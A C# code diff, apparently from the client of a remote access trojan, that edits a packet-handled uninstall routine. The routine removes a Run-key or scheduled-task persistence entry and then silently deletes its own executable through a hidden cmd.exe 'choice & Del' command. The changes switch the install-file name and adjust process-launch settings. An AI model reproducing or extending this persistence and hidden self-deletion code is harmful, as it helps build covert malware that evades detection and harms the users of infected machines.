@@ -19,16 +19,16 @@ namespace Client.Handle_Packet
                 try
                 {
                     if (!Methods.IsAdmin())
-                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue(Path.GetFileName(Settings.ClientFullPath));
+                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue(Settings.InstallFile);
                     else
                     {
                         Process.Start(new ProcessStartInfo()
                         {
                             FileName = "schtasks",
-                            Arguments = $"/delete /tn {Path.GetFileName(Settings.ClientFullPath)} /f",
+                            Arguments = $"/delete /tn {Settings.InstallFile} /f",
                             CreateNoWindow = true,
                             ErrorDialog = false,
-                            UseShellExecute = true,
+                            UseShellExecute = false,
                             WindowStyle = ProcessWindowStyle.Hidden
                         });
                     }
@@ -43,6 +43,7 @@ namespace Client.Handle_Packet
                     Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true,
+                    UseShellExecute = false,
                     FileName = "cmd.exe"
                 };
             }
